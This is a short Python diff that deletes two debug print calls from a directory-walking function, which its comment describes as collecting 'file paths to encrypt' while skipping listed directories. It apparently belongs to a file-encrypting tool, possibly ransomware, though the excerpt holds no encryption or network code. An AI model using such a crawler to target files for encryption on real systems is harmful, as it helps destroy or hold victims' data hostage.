@@ -2,10 +2,8 @@ import os
 
 # crawl files and return file paths to encrypt
 def crawl_files(start_dir, dirs_to_skip):
-    print("crawling")
     result = []
     for path, dirs, files in os.walk(start_dir):
-        print(path)
         if should_skip(path, dirs_to_skip):
             continue
         for name in files:
